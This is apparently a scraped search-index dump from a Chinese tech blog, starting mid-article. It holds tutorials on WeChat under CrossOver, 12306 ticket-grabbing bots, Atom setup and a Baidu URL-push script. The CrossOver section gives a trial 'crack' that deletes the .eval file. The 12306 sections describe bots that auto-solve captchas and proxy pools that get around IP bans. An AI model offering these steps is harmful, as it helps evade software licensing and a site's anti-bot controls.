compat-openldap.i686 openldap.i686 openldap-devel.i686 compat-openldap.x86_64 openldap.x86_64 openldap-devel.x86_64 微信输入框无法显示光标与文字，只能复制黏贴下载 Windows 版的 riched20.dll 动态链接库（必须是这个版本），然后将下载得到的 riched20.dll 文件拷贝到 CrossOver 容器对应的 system32、syswow64（重点） 目录下，即覆盖掉 CrossOver 容器内的 riched20.dll 文件。例如当 CrossOver 容器的名称为 WinXp-64-bit，那么则需要将 Windows 版的 riched20.dll 拷贝到 ~/.cxoffice/WinXp-64-bit/drive_c/windows/system32 和 ~/.cxoffice/WinXp-64-bit/drive_c/windows/syswow64 目录下，拷贝完成后重启微信客户端。 微信输入框无法使用搜狗输入法（Linux 版）输入中文如果在 Linux 系统内，已经安装了 Linux 版的搜狗输入法，但无法在微信的输入框内输入中文，这可能是系统缺少了输入法的环境变量配置信息导致的。Crossover 的应用快捷方式文件默认存放在 ~/.local/share/applications/ 文件夹中，从中找到 xxx微信xxx.desktop 文件，然后在 desktop 文件中找到 lnk 文件的路径，最后使用编辑器添加相关配置信息到 lnk 文件中，完成后重启微信客户端。 123456789101112# 查看微信的应用快捷方式文件# cat ~/.local/share/applications/cxmenu-cxoffice-955d8f89-fd24-4c49-addb-5dc0e8a63a1e-2l9ih12-微信.desktop# 找到这行内容：Exec="/home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/微信/微信.lnk" %u# 编辑lnk文件，在 #!/bin/sh 之后和 exec 之前添加以下环境变量配置# vim /home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/微信/微信.lnkexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx" CrossOver 安装小小中文输入法若上面配置了输入法的环境变量，依然无法解决微信中文输入的问题，此时可将小小输入法安装到与微信同一 CrossOver 容器之下，安装后可以使用该输入法输入中文。值得一提的是，CrossOver 安装小小输入法的方法和上面 CrossOver 安装微信的方法是一样的，点击此处可从本站下载小小输入法（V2.5.0-0）的 EXE 安装文件。 小小中文输入法的安装注意事项 小小输入法安装完成后，不要勾选” 运行小小输入法”，直接点击” 完成” 按钮即可，否则 CrossOver 的安装程序会一直运行，除非点击菜单栏的托盘图标手动退出小小输入法 小小输入法安装完成后，容器不会出现小小输入法的启动快捷方式，即在应用程序列表中无法直接通过点击图标的方式来启动输入法，但可以参照以下方法手动创建小小输入法的启动快捷方式 由于在容器中的 c:/Program Files (x86)/yong/ 目录下已经有了安装后的文件夹，因此可以在容器中通过 "运行命令" 的功能，手动创建小小输入法的快捷方式或者输入命令 /home/xxxx/.cxoffice/WinXp-64-bit/dosdevices/c:/Program Files (x86)/yong/yong.exe 来直接运行小小输入法，其中创建小小输入法快捷方式的步骤如下图： 小小中文输入法的使用注意事项 通过 CrossOver 安装的程序使用小小输入法后与宿主机上安装的输入法是互不干扰的，两者都可以独立正常使用 小小输入法中英文切换的默认快捷键是左边的 Ctrl 键，支持自定义输入法的快捷键 小小输入法每次都需要手动启动，且首次使用需要通过小小输入法在菜单栏上的托盘图标切换到拼音输入法 若已经通过菜单栏的托盘图标切换到拼音输入法，但在微信输入框中依然无法输入中文，此时可以单击菜单栏上的托盘图标，直至右下角出现小小输入法的状态栏，然后再尝试输入中文 若上面的方法都无法使用小小输入法输入中文，此时试试重启输入法，然后再多试几次 建议先启动小小输入法，然后再启动微信应用 微信运行的最终效果图 常见问题微信版本升级若需要升级微信的版本，首先在官网下载最新版微信 PC 客户端的二进制执行文件，然后通过 UI 界面卸载 CrossOver 容器里的旧版微信，最后在容器里安装最新版的微信 PC 客户端即可。 CrossOver 试用期已过CrossOver 默认试用时间为 15 天，在 Linux 系统下，如果 15 天过后还想继续试用，可以执行以下操作进行破解。CrossOver 的试用时间验证信息是写在每一个 winebottle 容器中的（其本质就是在容器所在目录下创建文件了名称为 .eval 的隐藏文件 ），不同容器之间是完全隔离的（不是写在全局配置中）。即使一个已使用的容器过期了，依然可以创建新的容器，并重新计算试用期，所以不需要重装 CrossOver 软件。 12# 删除.eval文件$ rm ~/.cxoffice/容器名称/.eval 安装其他 Windows 原生应用在 Linux 环境下，若需要安装 QQ、TIM、迅雷、Office 等其他主流的 Windows 应用，可以参考上面 CrossOver 安装微信 PC 客户端的过程；因为安装步骤基本都是大同小异的，重点在于细节问题的解决。 Linux 安装微信的可选方案总结 腾讯官方 Web 版微信 Franz + 微信（基于 Web 版） Electronic-Wechat（基于 Web 版） 虚拟机 + 微信原生 PC 客户端 CrossOver + 微信原生 PC 客户端 Winetricks（基于 Wine） + 微信原生 PC 客户端 Winetricks-ZH（基于 Wine） + 微信原生 PC 客户端 AppImage + AppImage 打包构建的（Wine + 微信原生 PC 客户端） Flatpak + Flatpak 打包构建的（Deepin-Wine + 微信原生 PC 客户端） Wine + PlayonLinux + 微信原生 PC 客户端 参考博客 在 Ubuntu 中使用 TIM 和微信 Linux 下的 Wine 生活（QQ、微信、Office） Linux 上有什么好的 QQ 和微信登陆解决方案 优麒麟 16.04 安装 CrossOver，QQ 输入不了中文 在 CrossOver 容器安装小小输入法解决无法输入中文的问题 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"12306 抢票软件的安装与使用",url:"/posts/8980c415.html",text:'前言 本教程主要介绍如何通过 Docker 安装和使用 TesterSunshine/12306 抢票软件，并配合使用本地的打码服务。 TesterSunshine/12306 抢票软件的功能 自动打码 自动登录 准点预售和捡漏 智能候补 邮件通知 Server 酱通知 Docker 和 Docker-Compose 安装 依赖 Docker 版本为 18.09 及以上，Docker-Compose 版本为 1.23.2 及以上，具体安装步骤可参考站内以下教程： Docker 安装教程 Docker-Compose 安装教程 TesterSunshine/12306 抢票软件安装 12345678910111213141516171819202122232425262728293031# 拉取源码# git clone https://github.com/testerSunshine/12306.git# 进入源码的根目录# cd 12306# 修改配置文件里的账号、出发城市、到达城市、抢票通知等信息（原配置文件里有详细的配置介绍，根据注释提示进行配置即可），若使用使用本地的打码服务，必须修改AUTO_CODE_TYPE为3，HOST改为"captcha:80"# vim TickerConfig.py# 拉取打码服务的Docker镜像# docker-compose pull captcha# 构建抢票服务的Docker镜像# docker-compose build ticket# 提示：若拉取或者构建Docker镜像耗时过长（网络下载慢），此时建议配置Docker使用代理或者更换Docker的镜像源# 创建并启动打码服务和抢票服务的Docker容器（命令执行成功后会自动开始抢票）# docker-compose up -d# 查看容器的状态# docker-compose ps# 查看抢票服务的日志信息# docker logs --follow ticket 或者 docker logs --follow ticket --tail 10# 停止抢票# docker-compose stop# 开始抢票# docker-compose start 当 TickerConfig.py 配置文件被更改后，需要重新构建抢票服务的 Docker 镜像，否则配置文件的更改不会生效，此时可执行以下步骤： 1234567891011# 进入源码的根目录# cd 12306# 关闭并销毁容器# docker-compose down# 重新构建抢票服务的Docker镜像# docker-compose build ticket# 创建并启动打码服务和抢票服务的Docker容器（执行成功后会自动开始抢票）# docker-compose up -d 抢票成功的日志信息 123456789101112131415正在第355次查询 乘车日期: 2018-02-12 车次G4741,G2365,G1371,G1377,G1329 查询无票 代理设置 无 总耗时429ms车次: G4741 始发车站: 上海 终点站: 邵阳 二等座:有正在尝试提交订票...尝试提交订单...出票成功排队成功, 当前余票还剩余: 359 张正在使用自动识别验证码功能验证码通过,正在提交订单提交订单成功！排队等待时间预计还剩 -12 ms排队等待时间预计还剩 -6 ms排队等待时间预计还剩 -7 ms排队等待时间预计还剩 -4 ms排队等待时间预计还剩 -4 ms恭喜您订票成功，订单号为：EB52743573, 请立即打开浏览器登录12306，访问‘未完成订单’，在30分钟内完成支付！ 关于 IP 被屏蔽 若出现下载验证码过期或者下载验证码失败的问题，此时应该是触发了 12306 封 IP 的策略，建议多重试几次。12306 现在封服务器（阿里云和腾讯云）IP 比较严重，尽量不要在服务器环境下运行。 最后更新 2020 年春节前后，使用该抢票程序成功帮朋友抢到 7 张高铁票，运行环境是单台 Vultr 低配服务器（国外）和家用 PC 机（国内） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"一款带 Web 管理界面的 12306 抢票软件",url:"/posts/94aa8dbb.html",text:'前言 本文主要介绍 Py12306 抢票软件的手动安装和 Docker 安装过程，适用于 Centos/Debian/Ubuntu，目前主流开源的 12306 抢票软件有：testerSunshine/12306、pjialin/py12306。 Py12306 抢票功能介绍 多日期查询余票 自动打码下单 用户状态恢复 电话语音通知 多账号、多任务、多线程支持 单个任务多站点查询 分布式运行 Docker 支持 动态修改配置文件 邮件通知 Web 管理页面 微信消息通知 代理池支持 (pyproxy-async) Python3.6 安装 Py12306 需要运行在 Python 3.6 以上版本。 12345678910111213141516171819202122232425262728293031323334# 安装依赖（Ubuntu），由于Ubuntu16+自带Python3，只需要安装pip3即可，无需再执行下面通过源码编译安装Python3的操作# apt install -y python3-pip# 安装依赖（Debian）# apt-get update -y# apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev# 安装依赖（Centos）# yum groupinstall -y "Development tools"# yum install -y sqlite-devel ncurses-devel ncurses-libs zlib-devel mysql-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel openssl-devel bzip2-devel expat-devel# 下载Python3.6.5源码# wget https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tgz# 解压源码# tar -xvf Python-3.6.5.tgz# 进入解压后的目录# cd Python-3.6.5# 预配置，并指定安装路径# ./configure --prefix=/usr/local/python3.6.5# 编译安装# make# make install# 创建软链接# ln -s /usr/local/python3.6.5/bin/pip3.6 /usr/bin/pip3.6# ln -s /usr/local/python3.6.5/bin/python3.6 /usr/bin/python3.6# 删除文件和目录# rm -rf Python-3.6.5# rm -f Python-3.6.5.tgz 手动安装 Py12306 123456789101112131415161718192021222324252627282930313233# 克隆源码# git clone https://github.com/pjialin/py12306# 进入源码目录# cd py12306# 安装依赖# pip3.6 install -r requirements.txt# 拷贝配置文件# cp env.py.example env.py# 更改配置文件内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 启动前测试（包括用户账号检测，乘客信息检测，车站检测）# python3.6 main.py -t# 默认不会进行通知测试，如果要对通知进行测试需要加上 -n 参数，其他参数包括 -c 指定自定义配置文件位置# python3.6 main.py -t -n# 前台运行程序# python3.6 main.py# 后台运行程序（建议修改配置文件，开启日志文件的记录，日志文件默认路径是：runtime/12306.log）# nohup python3.6 main.py &amp;# 后台运行程序的情况下，查看日志文件（前提是已开启日志文件的记录）# tail -f runtime/12306.log# 应用成功运行后，本地浏览器访问http://localhost:8008，即可打开Web管理界面，如需外网访问Web管理界面，需要打开防火墙端口8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload Docker 安装 Py12306 123456789101112131415161718192021222324252627# 新建文件夹存放配置文件# mkdir py12306# 进入新建的文件夹# cd py12306# 创建数据目录# mkdir data# 下载配置文件# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# 或者# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# 更改配置文件内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 启动容器（该命令必须在py12306文件夹内执行）# docker run -d --name py12306 -p 8008:8008 -v $(pwd):/config -v data:/data pjialin/py12306# 容器成功启动后，当前目录下会多了一个12306.log日志文件# tail -f 12306.log# 本地浏览器访问http://localhost:8008，即可打开Web管理界面，如需外网访问Web管理界面，需要打开防火墙端口8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload Docker-Compose 中使用 Py12306 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 新建文件夹存放配置文件# mkdir /usr/local/py12306# 进入新建的文件夹# cd /usr/local/py12306# 下载py12306配置文件# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# 或者# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# 更改py12306配置文件的内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 创建docker-compose配置文件# touch docker-compose.yml# 新增以下内容到docker-compose配置文件中# vim docker-compose.ymlversion: "3.5"services: redis: image: pjialin/py12306 container_name: py12306 restart: always privileged: false ports: - 8008:8008 volumes: - \'/usr/local/py12306:/config\' - \'/usr/local/py12306/env.py:/config/env.py\' - \'/usr/local/py12306/runtime:/code/runtime\'# 启动容器（必须在docker-compose.yml配置文件所在的目录下执行）# docker-compose up -d# 容器成功启动后的目录结构如下# tree /usr/local/py12306├── docker-compose.yml├── 12306.log├── env.py├── query│&nbsp;&nbsp; └── status.json├── runtime└── user └── xxxxxxx.cookie# 防火墙端口的开放和Web管理界面的访问，可参考上面的介绍 关于 IP 被屏蔽 目前查询和登录操作是分开的，查询是不依赖用户是否登录。12306 现在封服务器（阿里云和腾讯云）IP 比较严重，尽量不要在服务器环境下运行。关于分布式集群和代理池的支持，有兴趣的可以访问 Github 进一步学习。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"人工智能入门介绍",url:"/posts/d571deaa.html",text:'预备能力 英语能力 基础数学能力 熟悉一门编程语言 熟悉深度学习框架 6 级或托福 75 分 大学期间曾学习过单元微积分、多元微积分、线性代数、概率论 C、C++、Java、Python、MATLAB Tensorflow、Pytorch 人工智能三大方向 自然语言处理（NLP） 计算机视觉（CV） 推荐系统、计算广告 简介 主要用于解决文本自动分类、文本重要信息自动提取、数据挖掘、文本自动生成、对话机器人、知识图谱等领域，用以解决人类对文本信息分析与理解的自动化 主要用于解决人类对图形、图像、视频等信息的自动化处理，例如图像智能处理与识别、视频检测、图像自动生成、无人驾驶、人脸识别与检测等 主要用于解决从大量数据中获取有效数据，例如电影、图书推荐，异常信息挖掘，重要群落发现，关系网络计算等 技术 涉及经典人工智能方法、机器学习、深度学习方法 涉及计算机视觉的深度学习方法，并包括集计算机图形学、经典计算机视觉中的重点方法，同时也覆盖了基于对抗生成网络（GAN）的图像生成方法 涉及经典的机器学习、深度学习、以及推荐系统、广告预测、反欺诈识别、智能设计、分布式和大数据处理 主流机器学习框架国内外三大主流机器学习框架分别是 Tensorflow、PyTorch、PaddlePaddle，其他框架还有 SINGA、MXNet、Keras、Horovod。 全球科技公司的 AI 布局全球科技公司的 AI 全栈布局自研一般分为四层，包括芯片、框架、模型、和应用层。美国科技公司亚马逊、Google 也有类似的多层布局，而中国只有百度、阿里和腾讯。在应用层，国内的阿里和腾讯暂未涉足前景巨大、挑战也巨大的乘用车全无人驾驶。 全球科技公司的 ChatGPT 布局 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Atom 插件管理",url:"/posts/b2a15380.html",text:'Atom 解决在线安装或更新插件慢的问题 1234567891011121314# 方法一（配置代理，推荐使用）# 配置Atom代理$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# 检查安装环境$ apm install --check# 更新插件，并查看使用代理后，APM发出的更新请求是否都经过了代理$ apm update --verbose 1234567891011121314151617# 方法二（配置仓库源，由于APM的依赖很多并不是NPM的，因此即使使用了淘宝的NPM源也不一定能解决下载慢的问题）# 配置APM的仓库源$ vim ~/.atom/.apmrcregistry=https://registry.npm.taobao.org/# 配置NPM的仓库源$ npm -config set registry https://registry.npm.taobao.org# 检查APM的安装环境$ apm install --check# 查看APM的配置$ apm config list# 更新插件$ apm update --verbose Atom 离线安装插件 12345678910111213# 进入Atom插件所在的本地目录$ cd ~/.atom/packages# 在Atom的插件官网（https://atom.io/packages）上搜索插件，获取对应插件的代码仓库Git地址，并将源代码克隆下来$ git clone https://github.com/platformio/platformio-atom-ide-terminal# 进入插件的源码目录$ cd platformio-atom-ide-terminal# 执行NPM安装操作$ npm install# 重启Atom编辑器 Atom 插件管理 1234567891011# 查看所有已安装的插件（包括官方插件和社区插件）$ apm list# 查看Atom仓库中某个插件的版本信息$ apm show termination# 安装某个插件$ apm install termination# 卸载某个插件$ apm uninstall termination Atom 的 Markdown 插件 123456789101112131415161718192021222324252627# PDF预览$ apm install pdf-view# Markdown编写优化$ apm install markdown-writer# Markdown代码着色，提供代码片段生成$ apm install language-markdown# 将剪贴面板中的图片复制到本地文件夹$ apm install markdown-image-paste# Markdown预览滚动同步$ apm install markdown-scroll-sync# Markdown表格插入$ apm install markdown-table-editor# Markdown导出PDF$ apm install markdown-themeable-pdf# Markdown预览（方案一）$ apm install markdown-preview-plus# Markdown预览（方案二），推荐使用$ apm install language-gfm-enhanced$ apm install markdown-preview-enhanced Atom 的 Markdown 图床插件 Atom 编写 Markdown 文件，通过插件将图片上传到七牛图床，可参考本站教程 1234567891011121314# 将剪贴面板中的图片上传到指定的图床，需要额外安装针对图床的上传插件$ apm install markdown-assistant# 阿里云图床上传插件，支持 markdown-assistant$ apm install oss-uploader# 微博图床上传插件，支持 markdown-assistant$ apm installweibo-uploader# 青云图床上传插件，支持 markdown-assistant$ apm install qcloud-uploader# 七牛图床（对象存储）上传插件，支持 markdown-assistant$ apm install qiniu-uploader Atom 的 Git 插件 1234567891011121314# 图形化Git提交记录$ apm install git-log# 通过Ctrl+Shift+P执行Git命令$ apm install git-plus# 适用于Git的图形化操作面板$ apm install git-control# 适用于Git的合并工具$ apm install merge-conflicts#显示文件夹的Git状态$ apm install tree-view-git-status Atom 其他常用插件 1234567891011121314# 图标美化$ apm install file-icons# 适用于Atom的配置备份与同步$ apm install sync-settings# 在当前目录打开系统原生的终端控制台$ apm install open-terminal-here# 终端控制台（方案一），推荐使用$ apm install termination# 终端控制台（方案二）$ apm install platformio-ide-terminal markdown-image-paste 插件的配置示例 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Linux 安装 Atom 编辑器",url:"/posts/90c5573a.html",text:'最新公告 截止 2021 年 10 月 22 日，Atom 官方宣布 1.58.0 以上版本不再支持运行在 CentOS7（或 RedHat 7），即 Atom 无法通过 YUM 在线安装或者 RPM 包离线安装。若希望在 CentOS7 上继续使用 Atom，请确保 Atom 的版本小于等于 1.57，详情请看这里。 相关站点 Atom Github Atom 官方安装教程（Linux 版） Atom 官方源码安装教程（Linux 版） Debian、Ubuntu 安装 Atom 方法一：通过 Atom 官方的软件包存储库来安装，优点是能够在官方发布新版本时，很方便地更新 Atom 1234567891011# 添加Key# wget -qO - https://packagecloud.io/AtomEditor/atom/gpgkey | apt-key add -# 添加软件包存储库# sh -c \'echo "deb [arch=amd64] https://packagecloud.io/AtomEditor/atom/any/ any main" &gt; /etc/apt/sources.list.d/atom.list\'# 更新软件源列表# apt-get update# 安装Atom# apt-get install atom 方法二：下载 Atom 的 DEB 软件包并直接安装 12345# 安装Atom# dpkg -i atom-amd64.deb# 若安装过程提示缺失依赖，可执行下述命令解决# apt-get -f install CentOS 安装 Atom 方法一：通过 Atom 官方的软件包存储库来安装，优点是能够在官方发布新版本时，很方便地更新 Atom 12345678# 添加Key# rpm --import https://packagecloud.io/AtomEditor/atom/gpgkey# 添加软件包存储库# sh -c \'echo -e "[Atom]\\nname=Atom Editor\\nbaseurl=https://packagecloud.io/AtomEditor/atom/el/7/\\$basearch\\nenabled=1\\ngpgcheck=0\\nrepo_gpgcheck=1\\ngpgkey=https://packagecloud.io/AtomEditor/atom/gpgkey" &gt; /etc/yum.repos.d/atom.repo\'# 安装Atom# yum install atom 方法二：下载 Atom 的 RPM 软件包并直接安装 12# 安装Atom# yum install -y atom.x86_64.rpm 源码安装 Atom 若项目日常开发中遇到 Atom 的 Bug，或者是想尝试向 Atom 的系统核心添加功能，则需要在 Dev 模式下运行 Atom，并访问本地的 Atom 源码。 克隆 Atom 的源码，并以开发者模式启动： 12345678910111213141516171819# 克隆Atom的源码# 建议下载Github Releases页面上发布的源码压缩包，而不是直接克隆Atom的master分支代码$ git clone git@github.com:your-username/atom.git# 进入Atom的源码目录$ cd atom# 安装Atom的依赖，如果安装过程出现“keyboard-layout”包构建失败的错误，此时需要额外安装"libxkbfile-devel"软件包$ ./script/bootstrap# 使用开发模式启动Atom$ atom --dev# 或者指定Atom的源码路径，也可以通过设置环境变量"ATOM_DEV_RESOURCE_PATH"来指定源码所在的路径$ atom --dev atom-source-path# 提示：# 建议通过设置环境变量"ATOM_DEV_RESOURCE_PATH"，指定Atom源码所在的路径# 如果 atom 命令在终端中没有响应，请尝试 atom-dev 或 atom-beta，后缀取决于所克隆的特定源代码的版本 本地测试运行 Atom： 12345# 进入Atom的源码目录$ cd atom# 测试$ atom --test spec 构建生成 Atom 的安装包 Ubuntu、Debian 构建生成 DEB 安装包： 123456789101112131415# 安装依赖# apt-get install build-essential git libsecret-1-dev fakeroot rpm libx11-dev libxkbfile-dev# 如果下面执行 script/build 脚本出现错误，则可能需要使用C++11安装更新的C++编译器# add-apt-repository ppa:ubuntu-toolchain-r/test# apt-get update# apt-get install gcc-5 g++-5# update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 80 --slave /usr/bin/g++ g++ /usr/bin/g++-5# update-alternatives --config gcc # or choose gcc-5 from the list# 进入Atom的源码目录$ cd atom# 构建安装包$ ./script/build --create-debian-package CentOS 构建生成 RPM 安装包： 12345678# 安装依赖# yum install -y make gcc gcc-c++ glibc-devel git-core libsecret-devel rpmdevtools libxkbfile-devel# 进入Atom的源码目录$ cd atom# 构建安装包$ ./script/build --create-rpm-package Atom 设置代理 123456789101112# 方法一# 设置代理$ apm config set strict-ssl false$ apm config set proxy YOUR_PROXY_ADDRESS$ apm config set http-proxy YOUR_PROXY_ADDRESS$ apm config set https-proxy YOUR_PROXY_ADDRESS# 验证代理配置是否正确$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy 12345678910111213# 方法二# 编辑Atom的配置文件，添加代理配置$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# 验证代理配置是否正确$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy Atom 的配置文件 Atom 默认的配置文件存放在 ~/.atom 目录下，其中的 ~/.atom/packages 用于存放 Atom 的插件，~/.atom 目录可以移植到不同的平台（Linux、Window、Mac）。在开发者模式下，Atom 默认加载的插件目录为：~/.atom/dev/packages。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发工具"},{title:"百度站长链接提交 - 主动推送（Python 版）",url:"/posts/920b584b.html",text:'前言在加速百度搜索引擎收录站点方面，百度站长目前提供自动提交链接和手动提交链接两种方式，其中自动提交又分为主动推送、自动推送和 sitemap 三种形式。按百度的说法，主动推送的效果最好，百度站长平台后台提供了 Curl、PHP、Ruby 的推送示例代码，但唯独没有提供 Python 示例代码。本文会给出现成的 Python 版本主动推送代码，系统环境依赖 Linux，软件环境依赖 Python3、Curl。 Python3 代码以下代码会读取特定域名下的 sitemap 站点地图文件，然后通过 Curl 命令将站点地图文件中合法 （结尾为 .html）的 URL 批量提交给百度站长平台，请自行替换代码中的 domain、token、site_map_url 变量值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# -*- coding: utf-8 -*-import reimport loggingimport subprocessfrom io import StringIOfrom urllib import request# 站点域名domain = \'www.example.com\'# 在百度站长申请的推送用的准入密钥token = \'xxxxxxxxxxxxxxxxx\'# 站点地图的URLsite_map_url = \'https://www.example.com/sitemap.xml\'# 最大的链接推送数量push_max_lines = 1000# 推送的URL链接文件push_urls_file = "/tmp/baidu_zhanzhang_push_url.txt"# 数据推送的接口push_url = \'http://data.zz.baidu.com/urls?site={domain}&amp;token={token}\'.format(domain=domain, token=token)# 日志文件log_file = "/tmp/baidu/baidu_zhanzhang_push.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: return \'\'def createUrlFile(url_file_path, max_lines): content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') index = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): url = getUrl(line) if(url != \'\'): index = index + 1 url_file.writelines(url + "\\n") if(index &gt;= max_lines): break url_file.close() website_map_file.close()def pushUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(push_urls_file, push_max_lines) pushUrlFile(push_url, push_urls_file, log_file) Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时主动提交链接到百度站长平台。 12# 每隔两小时主动提交一次链接0 */2 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_zhanzhang_push.py 脚本输出的日志信息123456789$ cat /tmp/baidu/baidu_zhanzhang_push.log2019-02-18 23:15:20,985 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 